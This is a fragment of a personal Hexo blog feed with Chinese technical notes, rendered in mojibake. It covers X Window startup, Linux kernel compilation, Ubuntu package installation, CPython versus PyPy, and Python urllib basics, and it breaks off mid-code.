è¦æ±‚çš„äº‹ä»¶çš„å¤„ç†. å…¶ä¸»è¦å·¥ä½œä¸ºå¤„ç†æ¥è‡ª X Server çš„æ“ä½œï¼Œå°†è¯¥æ“ä½œå¤„ç†ä¸ºç»˜å›¾æ•°æ®ï¼Œå†å°†è¿™äº›ç»˜å›¾æ•°æ®ä¼ å›ç»™ X Server. æ¯ä¸ª X Client å¹¶ä¸çŸ¥é“å…¶ä»– X Client çš„å­˜åœ¨ã€‚</li></ul><p><mark>X Window Manager</mark>: ç‰¹æ®Šçš„ X Client, è´Ÿè´£ç®¡ç†æ‰€æœ‰çš„ X Client è½¯ä»¶ã€‚</p><p><mark>Display Manager</mark>: æä¾›ç™»å½•éœ€æ±‚ã€‚å¦‚ GNOME çš„ gdm(GNOME Display Manager).</p><h3 id="23-1-3-X-Window-System-çš„å¯åŠ¨æµç¨‹"><a href="#23-1-3-X-Window-System-çš„å¯åŠ¨æµç¨‹" class="headerlink" title="23.1.3 X Window System çš„å¯åŠ¨æµç¨‹"></a>23.1.3 X Window System çš„å¯åŠ¨æµç¨‹</h3><p>è¦å¯åŠ¨ X Window System, é¦–å…ˆè¦å¯åŠ¨ç®¡ç†ç¡¬ä»¶å’Œç»˜å›¾çš„ X Server, ç„¶åæ‰åŠ è½½ X Client.</p><p>å¯åœ¨å‘½ä»¤è¡Œè¾“å…¥ <code>startx</code> æ¥å¯åŠ¨ X çª—å£ã€‚</p><p>startx æ˜¯ä¸€ä¸ª shell è„šæœ¬ï¼Œä¼šä¸»åŠ¨å¸®å¿™ç”¨æˆ·å»ºç«‹ä»–ä»¬çš„ X æ‰€éœ€è¦å¼•ç”¨çš„é…ç½®æ–‡ä»¶ã€‚</p><p>è¯­æ³•:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ startx [X <span class="hljs-built_in">Client</span> å‚æ•°] -- [X <span class="hljs-built_in">Server</span> å‚æ•°]<br></code></pre></td></tr></table></figure><p>startx æœ€é‡è¦çš„ä»»åŠ¡æ˜¯æ‰¾åˆ°ç”¨æˆ·æˆ–æ˜¯ç³»ç»Ÿé»˜è®¤çš„ X Server ä¸ X Client çš„é…ç½®æ–‡ä»¶ã€‚ç”¨æˆ·èƒ½é€šè¿‡å¤–æ¥å‚æ•°æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶çš„å†…å®¹ã€‚      </p><p>å®é™…ä¸Šå¯åŠ¨ X çš„æ˜¯ xinit è¿™ä¸ªç¨‹åºï¼Œstartx ä»…æ‰¾å‡ºè®¾ç½®å€¼ã€‚</p><p>xinit çš„è¯­æ³•:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">xinit [<span class="hljs-keyword">client</span> option] -- [<span class="hljs-keyword">server</span> or <span class="hljs-keyword">display</span> option]<br></code></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œè¾“å…¥ <code>startx</code> ç­‰äº <code>xinit /etc/X11/xinit/xinitrc -- /etc/X11/xinit/xserverrc</code></p><p>xinit ä¸»è¦åœ¨å¯åŠ¨ X Server å’ŒåŠ è½½ X Client, ä½†è¿™ä¸ª xinit æ‰€éœ€è¦çš„å‚æ•°æ˜¯ç”± startx å¸®å¿™æŸ¥æ‰¾ã€‚</p><p>X å¯åŠ¨çš„æ—¶å€™å¯ä»¥æŒ‡å®šå¯åŠ¨çš„æ¥å£ã€‚</p><p>åœ¨ X Window System çš„ç¯å¢ƒä¸‹ï¼Œç§° 6000 ç«¯å£ä¸ºç¬¬ 0 ä¸ªæ˜¾ç¤ºæ¥å£ï¼Œå³ hostname:0. é€šå¸¸å†™ä¸º <code>:0</code></p><h3 id="23-1-4-X-å¯åŠ¨æµç¨‹æµ‹è¯•"><a href="#23-1-4-X-å¯åŠ¨æµç¨‹æµ‹è¯•" class="headerlink" title="23.1.4 X å¯åŠ¨æµç¨‹æµ‹è¯•"></a>23.1.4 X å¯åŠ¨æµç¨‹æµ‹è¯•</h3><h1 id="ç¬¬24ç« -Linux-å†…æ ¸ç¼–è¯‘ä¸ç®¡ç†"><a href="#ç¬¬24ç« -Linux-å†…æ ¸ç¼–è¯‘ä¸ç®¡ç†" class="headerlink" title="ç¬¬24ç«  Linux å†…æ ¸ç¼–è¯‘ä¸ç®¡ç†"></a>ç¬¬24ç«  Linux å†…æ ¸ç¼–è¯‘ä¸ç®¡ç†</h1><p>å†…æ ¸æ§åˆ¶ä¸»æœºçš„æ‰€æœ‰ç¡¬ä»¶å¹¶æä¾›ç³»ç»Ÿæ‰€æœ‰çš„åŠŸèƒ½.</p><p>å†…æ ¸ (kernel) æ˜¯æ•´ä¸ªæ“ä½œç³»ç»Ÿçš„æœ€åº•å±‚, å®ƒè´Ÿè´£æ•´ä¸ªç¡¬ä»¶çš„é©±åŠ¨, ä»¥åŠæä¾›å„ç§ç³»ç»Ÿæ‰€éœ€çš„å†…æ ¸åŠŸèƒ½, åŒ…æ‹¬é˜²ç«å¢™åŠŸèƒ½, æ˜¯å¦æ”¯æŒ LVM æˆ–ç£ç›˜é…é¢ç­‰æ–‡ä»¶ç³»ç»ŸåŠŸèƒ½.</p><p>æƒ³è¦è®©è®¡ç®—æœºå®Œæˆçš„å·¥ä½œ, éƒ½éœ€è¦é€šè¿‡å†…æ ¸çš„å¸®åŠ©. æƒ³è¦è®©è®¡ç®—æœºå®Œæˆçš„å·¥ä½œ, éƒ½å¿…é¡»è¦æœ‰å†…æ ¸æ”¯æŒæ‰å¯ä»¥.</p><p>å†…æ ¸æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶, å…¶åŒ…å«äº†é©±åŠ¨ä¸»æœºå„é¡¹ç¡¬ä»¶çš„æ£€æµ‹ç¨‹åºä¸é©±åŠ¨æ¨¡å—.</p><p>è¿™ä¸ªå†…æ ¸æ–‡ä»¶é€šå¸¸è¢«å‘½åä¸º <code>vmlinuz-xxx</code>, æœ‰æ—¶ä¹Ÿä¸ä¸€å®š, å› ä¸ºä¸€å°ä¸»æœºä¸Šé¢å¯ä»¥æ‹¥æœ‰å¤šä¸ªå†…æ ¸æ–‡ä»¶, åªæ˜¯å¯åŠ¨çš„æ—¶å€™ä»…èƒ½é€‰æ‹©ä¸€ä¸ªæ¥åŠ è½½.</p><p>ä»€ä¹ˆæ˜¯å†…æ ¸æ¨¡å— (kernel module) ? ä¹Ÿå°±æ˜¯ Linux çš„æ¨¡å—åŒ–è®¾ç½®, ç”±äºç¡¬ä»¶æ›´æ–°å¿«, éœ€è¦ä¸æ–­æ·»åŠ . å°†ç±»ä¼¼é©±åŠ¨çš„ä¸œè¥¿ç‹¬ç«‹å‡ºå†…æ ¸, ç¼–è¯‘æˆæ¨¡å—, ç„¶åå†…æ ¸å¯ä»¥åœ¨ç³»ç»Ÿæ­£å¸¸è¿è¡Œçš„è¿‡ç¨‹å½“ä¸­åŠ è½½è¿™ä¸ªæ¨¡å—, è¿™æ ·å°±èƒ½åœ¨ä¸éœ€è¦ä¿®æ”¹å†…æ ¸çš„å‰æä¸‹, åªéœ€è¦ç¼–è¯‘å‡ºé€‚å½“çš„æ¨¡å—, å¹¶åŠ è½½å®ƒ.</p><p>æ¨¡å—æ”¾åœ¨ <code>/lib/modules/(uname -r)/kernel</code> ä¸­.</p><h3 id="24-1-2-æ›´æ–°å†…æ ¸çš„ç›®çš„"><a href="#24-1-2-æ›´æ–°å†…æ ¸çš„ç›®çš„" class="headerlink" title="24.1.2 æ›´æ–°å†…æ ¸çš„ç›®çš„"></a>24.1.2 æ›´æ–°å†…æ ¸çš„ç›®çš„</h3><p>é™¤äº† BIOS (æˆ– UEFI) ä¹‹å¤–, å†…æ ¸æ˜¯æ“ä½œç³»ç»Ÿæœ€æ—©è¢«åŠ è½½åˆ°å†…å­˜çš„ä¸œè¥¿, å®ƒåŒ…å«äº†æ‰€æœ‰å¯ä»¥è®©ç¡¬ä»¶å’Œè½¯ä»¶å·¥ä½œçš„ä¿¡æ¯.</p><p>å¯é‡æ–°ç¼–è¯‘å†…æ ¸æ¥å»é™¤æ‰å¾ˆå¤šç”¨ä¸åˆ°çš„åŠŸèƒ½.</p><p>å†…æ ¸çš„ä¸»è¦å·¥ä½œå°±æ˜¯ç®¡ç†ç¡¬ä»¶.</p><p>è·å–æœ€æ–°ç¨³å®šç‰ˆå†…æ ¸ä»£ç :</p><ul><li><a href="http://www.kernel.org/">å†…æ ¸å®˜ç½‘</a></li><li><a href="http://centos.ustc.edu.cn/linux-kernel/">ä¸­ç§‘å¤§é•œåƒç«™</a></li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">æ¸…åå¤§å­¦é•œåƒç«™</a></li></ul><h4 id="ä¿å­˜åŸæœ¬è®¾ç½®-åˆ©ç”¨-patch-å‡çº§å†…æ ¸æºä»£ç "><a href="#ä¿å­˜åŸæœ¬è®¾ç½®-åˆ©ç”¨-patch-å‡çº§å†…æ ¸æºä»£ç " class="headerlink" title="ä¿å­˜åŸæœ¬è®¾ç½®: åˆ©ç”¨ patch å‡çº§å†…æ ¸æºä»£ç "></a>ä¿å­˜åŸæœ¬è®¾ç½®: åˆ©ç”¨ patch å‡çº§å†…æ ¸æºä»£ç </h4><p>æ¯æ¬¡å†…æ ¸å‘å¸ƒæ—¶, é™¤äº†å‘å¸ƒå®Œæ•´çš„å†…æ ¸å‹ç¼©æ–‡ä»¶ä¹‹å¤–, ä¹Ÿä¼šå‘å¸ƒè¯¥ç‰ˆæœ¬ä¸å‰ä¸€ç‰ˆæœ¬çš„å·®å¼‚æ€§ patch æ–‡ä»¶. æ¯ä¸ªå†…æ ¸çš„ patch ä»…æœ‰é’ˆå¯¹å‰ä¸€ç‰ˆçš„å†…æ ¸æ¥åˆ†æ.</p><h3 id="24-1-5-å†…æ ¸æºä»£ç çš„è§£å‹ç¼©-å®‰è£…-æŸ¥çœ‹"><a href="#24-1-5-å†…æ ¸æºä»£ç çš„è§£å‹ç¼©-å®‰è£…-æŸ¥çœ‹" class="headerlink" title="24.1.5 å†…æ ¸æºä»£ç çš„è§£å‹ç¼©, å®‰è£…, æŸ¥çœ‹"></a>24.1.5 å†…æ ¸æºä»£ç çš„è§£å‹ç¼©, å®‰è£…, æŸ¥çœ‹</h3><p>Linux å†…æ ¸æ–‡ä»¶ä¸€èˆ¬å»ºè®®æ”¾åœ¨ <code>/usr/src/kernels/</code> ä¸‹.</p><p>å…¶ä¸­çš„ <code>Documentation</code> ç›®å½•ä¸‹æœ‰è¯´æ˜.</p><h2 id="24-2-å†…æ ¸ç¼–è¯‘å‰çš„é¢„å¤„ç†ä¸å†…æ ¸åŠŸèƒ½é€‰æ‹©"><a href="#24-2-å†…æ ¸ç¼–è¯‘å‰çš„é¢„å¤„ç†ä¸å†…æ ¸åŠŸèƒ½é€‰æ‹©" class="headerlink" title="24.2 å†…æ ¸ç¼–è¯‘å‰çš„é¢„å¤„ç†ä¸å†…æ ¸åŠŸèƒ½é€‰æ‹©"></a>24.2 å†…æ ¸ç¼–è¯‘å‰çš„é¢„å¤„ç†ä¸å†…æ ¸åŠŸèƒ½é€‰æ‹©</h2><p>æ•´ä¸ªå†…æ ¸ç¼–è¯‘çš„é‡è¦å·¥ä½œå°±æ˜¯é€‰æ‹©ä½ æƒ³è¦çš„åŠŸèƒ½.</p><h3 id="24-2-1-ç¡¬ä»¶ç¯å¢ƒæŸ¥çœ‹ä¸å†…æ ¸åŠŸèƒ½è¦æ±‚"><a href="#24-2-1-ç¡¬ä»¶ç¯å¢ƒæŸ¥çœ‹ä¸å†…æ ¸åŠŸèƒ½è¦æ±‚" class="headerlink" title="24.2.1 ç¡¬ä»¶ç¯å¢ƒæŸ¥çœ‹ä¸å†…æ ¸åŠŸèƒ½è¦æ±‚"></a>24.2.1 ç¡¬ä»¶ç¯å¢ƒæŸ¥çœ‹ä¸å†…æ ¸åŠŸèƒ½è¦æ±‚</h3><h3 id="24-2-2-ä¿æŒå¹²å‡€æºä»£ç -make-mrproper"><a href="#24-2-2-ä¿æŒå¹²å‡€æºä»£ç -make-mrproper" class="headerlink" title="24.2.2 ä¿æŒå¹²å‡€æºä»£ç : make mrproper"></a>24.2.2 ä¿æŒå¹²å‡€æºä»£ç : make mrproper</h3><p>å¤„ç†æ‰ç¼–è¯‘è¿‡ç¨‹çš„ç›®æ ‡æ–‡ä»¶ (<code>*.o</code>) ä»¥åŠé…ç½®æ–‡ä»¶.</p><p>è¿›å…¥å†…æ ¸æ‰€åœ¨ç›®å½•å:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make mrproper</span><br></code></pre></td></tr></table></figure><p>å…¶ä¼šå°†å†…æ ¸åŠŸèƒ½é€‰æ‹©æ–‡ä»¶ä¹Ÿåˆ é™¤, å› æ­¤ä¸€èˆ¬åœ¨å†…æ ¸ç¼–è¯‘ä¹‹å‰è¿›è¡Œè¿™ä¸ªæ“ä½œ.</p><p>åˆ é™¤ç›®æ ‡æ–‡ä»¶ä¹‹ç±»çš„ç¼–è¯‘è¿‡ç¨‹äº§ç”Ÿçš„ä¸­é—´æ–‡ä»¶:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make clean</span> <br></code></pre></td></tr></table></figure><h3 id="24-2-3-å¼€å§‹é€‰æ‹©å†…æ ¸åŠŸèƒ½"><a href="#24-2-3-å¼€å§‹é€‰æ‹©å†…æ ¸åŠŸèƒ½" class="headerlink" title="24.2.3 å¼€å§‹é€‰æ‹©å†…æ ¸åŠŸèƒ½"></a>24.2.3 å¼€å§‹é€‰æ‹©å†…æ ¸åŠŸèƒ½</h3><p>å†…æ ¸åŠŸèƒ½çš„é€‰æ‹©, æœ€ç»ˆä¼šåœ¨å¦‚ <code>/usr/src/kernels/linux-3.10.89/</code> ä¸‹é¢äº§ç”Ÿä¸€ä¸ªåä¸º <code>.config</code> çš„éšè—æ–‡ä»¶, è¿™ä¸ªæ–‡ä»¶å°±æ˜¯ <code>/boot/config-xxx</code> æ–‡ä»¶.</p><h4 id="å¸¸è§çš„å»ºç«‹æ–¹æ³•"><a href="#å¸¸è§çš„å»ºç«‹æ–¹æ³•" class="headerlink" title="å¸¸è§çš„å»ºç«‹æ–¹æ³•"></a>å¸¸è§çš„å»ºç«‹æ–¹æ³•</h4><p>å‡ æ¡å‘½ä»¤, å…·ä½“è§ä¹¦</p><p>å…³äºæ•´ä¸ªå†…æ ¸åŠŸèƒ½é€‰æ‹©çš„å»ºè®®:</p><ul><li>è‚¯å®šå†…æ ¸ä¸€å®šè¦çš„åŠŸèƒ½, ç›´æ¥ç¼–è¯‘åˆ°å†…æ ¸ä¸­ </li><li>å¯èƒ½åœ¨æœªæ¥ä¼šç”¨åˆ°, é‚£ä¹ˆå°½é‡ç¼–è¯‘æˆæ¨¡å—</li><li>ä¸çŸ¥é“åŠŸèƒ½, ä¿ç•™é»˜è®¤å€¼æˆ–å°†å®ƒç¼–è¯‘æˆä¸ºæ¨¡å—</li></ul><h3 id="24-2-4-å†…æ ¸åŠŸèƒ½è¯¦ç»†é€‰é¡¹é€‰æ‹©"><a href="#24-2-4-å†…æ ¸åŠŸèƒ½è¯¦ç»†é€‰é¡¹é€‰æ‹©" class="headerlink" title="24.2.4 å†…æ ¸åŠŸèƒ½è¯¦ç»†é€‰é¡¹é€‰æ‹©"></a>24.2.4 å†…æ ¸åŠŸèƒ½è¯¦ç»†é€‰é¡¹é€‰æ‹©</h3><p>å…·ä½“çœ‹ä¹¦.</p><h2 id="24-3-å†…æ ¸çš„ç¼–è¯‘ä¸å®‰è£…"><a href="#24-3-å†…æ ¸çš„ç¼–è¯‘ä¸å®‰è£…" class="headerlink" title="24.3 å†…æ ¸çš„ç¼–è¯‘ä¸å®‰è£…"></a>24.3 å†…æ ¸çš„ç¼–è¯‘ä¸å®‰è£…</h2><p>æˆ‘çš„ Archlinux çš„å†…æ ¸æºä»£ç ä½äº <code>/lib/modules/5.19.12-arch1-1/kernel</code> è§„åˆ™ä¸º: <code>/lib/modules/$(uname -r)/build</code> åŠ <code>/lib/modules/$(uname -r)/source</code> è¿™ä¸¤ä¸ªé“¾æ¥æ–‡ä»¶.</p><p>é™¤äº† make å’Œ gcc å¤–, kernel-devel è¿™ä¸ªè½¯ä»¶ä¹Ÿè¦å®‰è£….</p><p>éœ€è¦äº†è§£åˆ°: å†…æ ¸, å†…æ ¸æ¨¡å—, é©±åŠ¨ç¨‹åºæ¨¡å—, å†…æ ¸æºä»£ç ä¸å¤´æ–‡ä»¶çš„ç›¸å…³æ€§.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu ä¸‹æŸ¥çœ‹å·²å¼€å¯çš„æœåŠ¡</title>
    <link href="/2022/08/23/Ubuntu-%E4%B8%8B%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%BC%80%E5%90%AF%E7%9A%84%E6%9C%8D%E5%8A%A1/"/>
    <url>/2022/08/23/Ubuntu-%E4%B8%8B%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%BC%80%E5%90%AF%E7%9A%84%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>å‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">service --<span class="hljs-keyword">status</span>-<span class="hljs-built_in">all</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cpython å’Œ PyPy</title>
    <link href="/2022/08/23/Cpython-%E5%92%8C-PyPy/"/>
    <url>/2022/08/23/Cpython-%E5%92%8C-PyPy/</url>
    
    <content type="html"><![CDATA[<p>Cpython å’Œ PyPy éƒ½æ˜¯ Python çš„è§£é‡Šå™¨ã€‚</p><h1 id="Cpython"><a href="#Cpython" class="headerlink" title="Cpython"></a>Cpython</h1><p>Cpython æ˜¯ç”¨ C è¯­è¨€å†™çš„, æ˜¯ç›®å‰ä½¿ç”¨æœ€å¹¿æ³›çš„è§£é‡Šå™¨ï¼Œå…¶å¯¹äº C&#x2F;Python API æœ‰å…¨é¢çš„æ”¯æŒã€‚ä½†æ˜¯å…¶æœ‰å…¨å±€é”çš„ç¼ºé™·ï¼Œä½¿å…¶æ€§èƒ½ä¸‹é™ã€‚</p><h1 id="PyPy"><a href="#PyPy" class="headerlink" title="PyPy"></a>PyPy</h1><p>ç”¨ Python å®ç°çš„è§£é‡Šå™¨ï¼Œå¯¹ C&#x2F;Python çš„ç¼ºé™·æœ‰å¤§å¹…æé«˜ï¼Œä½†æ˜¯å¯¹äº C&#x2F;Python API çš„æ”¯æŒä¸å…¨ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨ hexo ä¸­æ·»åŠ  CNAME æ–‡ä»¶</title>
    <link href="/2022/08/23/%E5%9C%A8-hexo-%E4%B8%AD%E6%B7%BB%E5%8A%A0-CNAME-%E6%96%87%E4%BB%B6/"/>
    <url>/2022/08/23/%E5%9C%A8-hexo-%E4%B8%AD%E6%B7%BB%E5%8A%A0-CNAME-%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>è¿›å…¥åšå®¢ç›®å½•, é‡Œé¢çš„ <code>public</code> æ–‡ä»¶å¤¹çš„å†…å®¹å°±æ˜¯ç”¨äºåˆ›å»ºç½‘ç«™:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/Blog/public<br><span class="hljs-built_in">touch</span> CNAME<br></code></pre></td></tr></table></figure><p>ç„¶åç¼–è¾‘ CNAME æ–‡ä»¶ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu å®‰è£… Gparted</title>
    <link href="/2022/08/23/Ubuntu-%E5%AE%89%E8%A3%85-Gparted/"/>
    <url>/2022/08/23/Ubuntu-%E5%AE%89%E8%A3%85-Gparted/</url>
    
    <content type="html"><![CDATA[<p>åœ¨å‘½ä»¤è¡Œä¸‹è½½:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> gparted<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu å®‰è£…ç™¾åº¦ç½‘ç›˜</title>
    <link href="/2022/08/23/Ubuntu-%E5%AE%89%E8%A3%85%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/"/>
    <url>/2022/08/23/Ubuntu-%E5%AE%89%E8%A3%85%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<p>è¿›å…¥å®˜ç½‘:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>pan.baidu.com/download<br></code></pre></td></tr></table></figure><p>ä¸‹è½½ <code>deb</code> åŒ…, ç„¶åå¼€å§‹å®‰è£…:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> ~/Downloads<br><span class="hljs-attribute">sudo</span> dpkg -i baidunetdisk_4.<span class="hljs-number">11</span>.<span class="hljs-number">5</span>_amd64.deb<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥å‘½ä»¤è¡Œä¸‹è½½:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> -O baidunetdisk_4.<span class="hljs-number">11</span>.<span class="hljs-number">5</span>_amd64.deb https://pan.baidu.com/download#linux/baidunetdisk_4.<span class="hljs-number">11</span>.<span class="hljs-number">5</span>_amd64.deb<br><span class="hljs-attribute">cd</span> ~/Downloads<br><span class="hljs-attribute">sudo</span> dpkg -i baidunetdisk_4.<span class="hljs-number">11</span>.<span class="hljs-number">5</span>_amd64.deb<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python Web Spider Notes</title>
    <link href="/2022/08/23/Python-Web-Spider-Notes/"/>
    <url>/2022/08/23/Python-Web-Spider-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬2ç« -åŸºæœ¬åº“çš„ä½¿ç”¨"><a href="#ç¬¬2ç« -åŸºæœ¬åº“çš„ä½¿ç”¨" class="headerlink" title="ç¬¬2ç«  åŸºæœ¬åº“çš„ä½¿ç”¨"></a>ç¬¬2ç«  åŸºæœ¬åº“çš„ä½¿ç”¨</h1><h2 id="2-1-urllib-çš„ä½¿ç”¨"><a href="#2-1-urllib-çš„ä½¿ç”¨" class="headerlink" title="2.1 urllib çš„ä½¿ç”¨"></a>2.1 urllib çš„ä½¿ç”¨</h2><p><code>urllib</code> sæ˜¯ Python å†…ç½®çš„ HTTP è¯·æ±‚åº“ã€‚</p><p>åŒ…å«å››ä¸ªæ¨¡å—:</p><ul><li>request, æ¨¡æ‹Ÿè¯·æ±‚çš„å‘é€</li><li>error, å¤„ç†å¼‚å¸¸</li><li>parse, æä¾› url çš„è§£å†³æ–¹æ³•</li><li>robotparser, åˆ¤æ–­å“ªäº›ç½‘ç«™å¯ä»¥çˆ¬</li></ul><h3 id="1-å‘é€è¯·æ±‚"><a href="#1-å‘é€è¯·æ±‚" class="headerlink" title="1 å‘é€è¯·æ±‚"></a>1 å‘é€è¯·æ±‚</h3><h4 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h4><p>å¦‚:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import urllib<span class="hljs-selector-class">.request</span><br><br>response = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(<span class="hljs-string">&#x27;https://www.python.org&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(response.read()</span></span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨ <code>type</code> æ–¹æ³•è¾“å‡ºå“åº”ç±»å‹:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">print</span>(<span class="hljs-keyword">type</span>(request))<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ <code>read()</code> æ–¹æ³•å¯ä»¥è·å¾—å“åº”çš„ç½‘é¡µå†…å®¹ï¼Œ<code>status</code> å±æ€§å¯ä»¥å¾—åˆ°å“åº”ç»“æœçš„çŠ¶æ€ç ã€‚</p><p><code>urlopen</code> æ–¹æ³•çš„ API:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">urllib.request.urlopen(url, <span class="hljs-attribute">date</span>=None, [timeout,]*, <span class="hljs-attribute">cafile</span>=None, <span class="hljs-attribute">capath</span>=None, <span class="hljs-attribute">cadefault</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">context</span>=None)<br></code></pre></td></tr></table></figure><h5 id="data-å‚æ•°"><a href="#data-å‚æ•°" class="headerlink" title="data å‚æ•°"></a>data å‚æ•°</h5><p>ä½¿ç”¨è¯¥å‚æ•°ï¼Œå…¶è¯·æ±‚æ–¹å¼ä¼šå˜ä¸º POST, ä¸”éœ€è¦å°†è¯¥å‚æ•°è½¬åŒ–ä¸º bytes ç±»å‹:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import urllib.parse<br>import urllib.request<br><br>data = bytes(urllib.parse.urlencode(&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;germey&#x27;</span>&#125;), <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>) # åˆ©ç”¨ urlencode å°†å­—å…¸è½¬æ¢ä¸ºå­—ç¬¦ä¸²<br>response = urllib.request.urlopen(<span class="hljs-string">&#x27;https://www.httpbin.org/post&#x27;</span>, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h5 id="timeout-å‚æ•°"><a href="#timeout-å‚æ•°" class="headerlink" title="timeout å‚æ•°"></a>timeout å‚æ•°</h5><p>ç”¨äºè®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚ </p><p>å…¶æ”¯æŒ HTTP, HTTPS, FTP è¯·æ±‚ã€‚</p><p>é€šè¿‡ <code>try ... expect ...</code> å®ç°å½“ä¸€ä¸ªç½‘ç«™é•¿æ—¶é—´æœªå“åº”å°±è·³è¿‡å¯¹å®ƒçš„æŠ“å–:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import socket<br>import urllib<span class="hljs-selector-class">.request</span><br>import urllib<span class="hljs-selector-class">.error</span><br><br>try:<br>    response = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(<span class="hljs-string">&#x27;https://www.httpbin.org/get&#x27;</span>, timeout=<span class="hljs-number">0.1</span>)<br>except urllib<span class="hljs-selector-class">.erro</span><span class="hljs-selector-class">.URLError</span> as e:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(e<span class="hljs-selector-class">.reason</span>, socket.timeout):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;TIME OUT&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å¸¸ç†æ¥è¯´ï¼Œ0.1 ç§’ä¸å¯èƒ½å¾—åˆ°æœåŠ¡å™¨çš„å“åº”ã€‚</p><h5 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h5><p>Request æ˜¯ä¸€ä¸ªç±»ï¼Œå°†å‘ urlopen ä¼ å…¥ä¸€ä¸ª url æ”¹ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œæ–¹ä¾¿é…ç½®å‚æ•°:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 